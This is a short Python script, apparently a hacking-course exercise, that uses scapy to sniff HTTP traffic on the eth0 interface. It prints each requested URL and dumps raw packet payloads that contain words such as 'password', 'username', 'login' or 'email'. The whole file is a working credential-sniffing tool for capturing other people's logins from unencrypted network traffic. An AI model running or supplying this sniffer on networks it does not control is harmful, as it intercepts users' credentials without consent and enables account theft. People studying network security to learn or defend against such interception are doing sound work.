#!/bin/python3

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["pass", "password","login","uname","username", "user", "email", "e-mail", "parola"]
            for keyword in keywords:
                if keyword.encode('utf-8') in load:
                    return load


def process_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request > " + str(url) + '\n\n')
    
    login_info = get_login_info(packet)    
    if login_info:
        print('[+] Possible username/password > ' + str(login_info) + '\n\n')


sniff("eth0")